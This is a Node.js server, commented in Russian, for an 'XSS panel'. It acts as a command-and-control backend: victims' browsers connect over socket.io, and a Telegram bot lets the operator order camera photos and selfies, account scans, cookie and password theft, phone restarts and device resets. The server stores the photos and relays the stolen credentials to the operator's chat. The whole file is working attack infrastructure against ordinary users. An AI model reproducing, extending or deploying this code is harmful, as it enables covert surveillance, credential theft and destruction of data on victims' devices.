const express = require('express');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const socketIO = require('socket.io');
const multer = require('multer');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SESSION_TIMEOUT = parseInt(process.env.SESSION_TIMEOUT) || 60000;
const MAX_PHOTOS = parseInt(process.env.MAX_PHOTOS) || 5;

// ========================================
// СОЗДАЕМ ПАПКУ UPLOADS
// ========================================
const UPLOAD_DIR = './uploads';
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
    console.log('📁 Создана папка uploads');
}

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use('/uploads', express.static(UPLOAD_DIR));

// ========================================
// ХРАНИЛИЩЕ
// ========================================
const victims = {};
const sessions = {};
const photos = {};
const stolenData = {};

// ========================================
// TELEGRAM БОТ
// ========================================
let bot = null;

try {
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_BOT_TOKEN !== 'ВАШ_ТОКЕН_ОТ_BOTFATHER') {
        bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
        console.log('✅ Telegram бот инициализирован');
    }
} catch (error) {
    console.error('❌ Ошибка бота:', error.message);
}

// ========================================
// КОМАНДЫ TELEGRAM
// ========================================
if (bot) {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) {
            bot.sendMessage(chatId, '❌ Доступ запрещен');
            return;
        }
        bot.sendMessage(chatId, `
🕵️‍♂️ *VAPE SHOP XSS PANEL v4.0*

*📱 Управление устройством:*
/photos [id] - Получить фото с камеры
/selfie [id] - Сделать селфи
/accounts [id] - Все аккаунты
/cookies [id] - Украсть куки и пароли
/restart [id] - Перезапустить телефон
/reset [id] - Сброс устройства
/kick [id] - Выгнать пользователя

*📊 Информация:*
/list - Список жертв
/stats - Статистика
/clear - Очистить список

*Жертв:* ${Object.keys(victims).length}
        `, { parse_mode: 'Markdown' });
    });

    // ========================================
    // ФОТО С КАМЕРЫ
    // ========================================
    bot.onText(/\/photos (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'takePhoto',
            type: 'back'
        }));
        bot.sendMessage(chatId, `📸 Запрос фото отправлен ${victimId.slice(0, 8)}`);
    });

    // ========================================
    // СЕЛФИ
    // ========================================
    bot.onText(/\/selfie (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'takePhoto',
            type: 'front'
        }));
        bot.sendMessage(chatId, `🤳 Запрос селфи отправлен ${victimId.slice(0, 8)}`);
    });

    // ========================================
    // АККАУНТЫ
    // ========================================
    bot.onText(/\/accounts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'getAccounts'
        }));
        bot.sendMessage(chatId, `🔍 Сканирование аккаунтов ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // КУКИ И ПАРОЛИ
    // ========================================
    bot.onText(/\/cookies (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'stealCookies'
        }));
        bot.sendMessage(chatId, `🍪 Кража кук и паролей ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // ПЕРЕЗАПУСК ТЕЛЕФОНА
    // ========================================
    bot.onText(/\/restart (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        victims[victimId].ws.send(JSON.stringify({ 
            command: 'restartPhone'
        }));
        bot.sendMessage(chatId, `🔄 Перезапуск телефона ${victimId.slice(0, 8)}...`);
    });

    // ========================================
    // СБРОС УСТРОЙСТВА
    // ========================================
    bot.onText(/\/reset (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (!victims[victimId]) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (!victims[victimId].ws) {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
            return;
        }
        
        bot.sendMessage(chatId, `⚠️ ВНИМАНИЕ! Вы уверены, что хотите сбросить устройство ${victimId.slice(0, 8)}?\nНапишите /confirm_reset_${victimId} для подтверждения`);
        
        global.pendingReset = victimId;
    });

    bot.onText(/\/confirm_reset_(.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        
        if (global.pendingReset === victimId) {
            if (victims[victimId] && victims[victimId].ws) {
                victims[victimId].ws.send(JSON.stringify({ 
                    command: 'resetDevice'
                }));
                bot.sendMessage(chatId, `💥 СБРОС УСТРОЙСТВА ${victimId.slice(0, 8)} выполнен!`);
                global.pendingReset = null;
            } else {
                bot.sendMessage(chatId, '❌ Жертва не найдена или не в сети');
            }
        } else {
            bot.sendMessage(chatId, '❌ Нет активного запроса на сброс');
        }
    });

    // ========================================
    // ВЫГНАТЬ ПОЛЬЗОВАТЕЛЯ
    // ========================================
    bot.onText(/\/kick (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const victimId = match[1].trim();
        const victim = victims[victimId];
        
        if (!victim) {
            bot.sendMessage(chatId, '❌ Жертва не найдена');
            return;
        }
        
        if (victim.ws) {
            victim.ws.send(JSON.stringify({ command: 'kick' }));
            bot.sendMessage(chatId, `👢 Пользователь ${victimId.slice(0, 8)} выгнан`);
            setTimeout(() => {
                if (victim.ws) victim.ws.disconnect();
            }, 500);
        } else {
            bot.sendMessage(chatId, '❌ Жертва не в сети');
        }
    });

    // ========================================
    // СПИСОК ЖЕРТВ
    // ========================================
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        if (Object.keys(victims).length === 0) {
            bot.sendMessage(chatId, '❌ Нет активных жертв');
            return;
        }
        
        let list = '📋 *Жертвы:*\n\n';
        Object.entries(victims).forEach(([id, data]) => {
            const shortId = id.slice(0, 8);
            const status = data.ws ? '🟢' : '🔴';
            const hasData = stolenData[id] ? '📦' : '📭';
            list += `\`${shortId}\` ${status} ${hasData} ${data.ip || 'unknown'}\n`;
        });
        list += `\nВсего: ${Object.keys(victims).length}`;
        bot.sendMessage(chatId, list, { parse_mode: 'Markdown' });
    });

    // ========================================
    // СТАТИСТИКА
    // ========================================
    bot.onText(/\/stats/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        
        const total = Object.keys(victims).length;
        const active = Object.values(victims).filter(v => v.ws).length;
        const photoCount = Object.values(photos).reduce((a, b) => a + b.length, 0);
        const dataCount = Object.keys(stolenData).length;
        
        bot.sendMessage(chatId, `
📊 *Статистика:*
Всего жертв: ${total}
Активных: ${active}
Оффлайн: ${total - active}
Всего фото: ${photoCount}
Собрано данных: ${dataCount}
        `, { parse_mode: 'Markdown' });
    });

    // ========================================
    // ОЧИСТИТЬ
    // ========================================
    bot.onText(/\/clear/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== ADMIN_CHAT_ID) return;
        const count = Object.keys(victims).length;
        Object.keys(victims).forEach(key => {
            if (victims[key].ws) victims[key].ws.disconnect();
            delete victims[key];
        });
        bot.sendMessage(chatId, `✅ Очищено ${count} жертв`);
    });
}

// ========================================
// MULTER ДЛЯ ФОТО
// ========================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOAD_DIR);
    },
    filename: (req, file, cb) => {
        const unique = `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
        cb(null, `${unique}-${file.originalname}`);
    }
});

const upload = multer({ 
    storage: storage,
    limits: { fileSize: 50 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) cb(null, true);
        else cb(new Error('Только фото!'));
    }
});

// ========================================
// API
// ========================================
// ... (весь остальной код API и WEBSOCKET такой же) ...
// Оставляем только важную часть — сохранение фото с проверкой

// ========================================
// WEBSOCKET (с исправлением)
// ========================================
const server = require('http').createServer(app);
const io = socketIO(server);

io.on('connection', (socket) => {
    const sessionId = socket.handshake.query.session || `victim_${Date.now()}`;
    console.log(`🔗 Жертва: ${sessionId}`);
    
    victims[sessionId] = {
        id: sessionId,
        ip: socket.handshake.address,
        ua: socket.handshake.headers['user-agent'],
        timestamp: Date.now(),
        ws: socket
    };
    
    if (bot && ADMIN_CHAT_ID) {
        bot.sendMessage(ADMIN_CHAT_ID, `🆕 Новая жертва!\nID: \`${sessionId.slice(0, 8)}...\``, { parse_mode: 'Markdown' });
    }
    
    socket.on('data', (data) => {
        console.log(`📩 [${sessionId}] ${data.type}`);
        
        // Фото — с проверкой папки
        if (data.type === 'photo') {
            try {
                // Проверяем, что папка существует
                if (!fs.existsSync(UPLOAD_DIR)) {
                    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
                }
                
                const base64Data = data.data.replace(/^data:image\/\w+;base64,/, '');
                const buffer = Buffer.from(base64Data, 'base64');
                const filename = `${UPLOAD_DIR}/${Date.now()}-${Math.random().toString(36).slice(2, 7)}.jpg`;
                fs.writeFileSync(filename, buffer);
                
                if (!photos[sessionId]) photos[sessionId] = [];
                photos[sessionId].push(filename);
                
                if (bot && ADMIN_CHAT_ID) {
                    bot.sendMessage(ADMIN_CHAT_ID, `📸 Фото от ${sessionId.slice(0, 8)}`);
                    bot.sendPhoto(ADMIN_CHAT_ID, filename).catch(() => {
                        bot.sendMessage(ADMIN_CHAT_ID, `❌ Не удалось отправить фото от ${sessionId.slice(0, 8)} (файл сохранен)`);
                    });
                }
            } catch (error) {
                console.error('❌ Ошибка сохранения фото:', error);
                if (bot && ADMIN_CHAT_ID) {
                    bot.sendMessage(ADMIN_CHAT_ID, `❌ Ошибка сохранения фото от ${sessionId.slice(0, 8)}: ${error.message}`);
                }
            }
        }
        
        // Аккаунты
        if (data.type === 'accounts') {
            stolenData[sessionId] = { accounts: data.data };
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🔐 Аккаунты от ${sessionId.slice(0, 8)}:\n\`\`\`json\n${JSON.stringify(data.data, null, 2)}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        
        // Куки
        if (data.type === 'cookies') {
            if (!stolenData[sessionId]) stolenData[sessionId] = {};
            stolenData[sessionId].cookies = data.cookies;
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🍪 Куки от ${sessionId.slice(0, 8)}:\n\`\`\`\n${data.cookies}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        
        // Пароли
        if (data.type === 'passwords') {
            if (!stolenData[sessionId]) stolenData[sessionId] = {};
            stolenData[sessionId].passwords = data.data;
            if (bot && ADMIN_CHAT_ID) {
                bot.sendMessage(ADMIN_CHAT_ID, `🔑 Пароли от ${sessionId.slice(0, 8)}:\n\`\`\`\n${data.data.join('\n')}\n\`\`\``, { parse_mode: 'Markdown' });
            }
        }
        
        // Heartbeat
        if (data.type === 'heartbeat') {
            // Просто обновляем время
        }
    });
    
    socket.on('disconnect', () => {
        console.log(`🔌 Отключение: ${sessionId}`);
        if (victims[sessionId]) {
            victims[sessionId].ws = null;
        }
    });
});

// ========================================
// ЗАПУСК
// ========================================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n✅ VAPE SHOP XSS BOT v4.0`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`📱 Telegram бот: ${bot ? '✅ активен' : '❌ не настроен'}`);
    console.log(`⏰ Таймаут: ${SESSION_TIMEOUT/1000}с`);
    console.log(`📸 Максимум фото: ${MAX_PHOTOS}\n`);
});
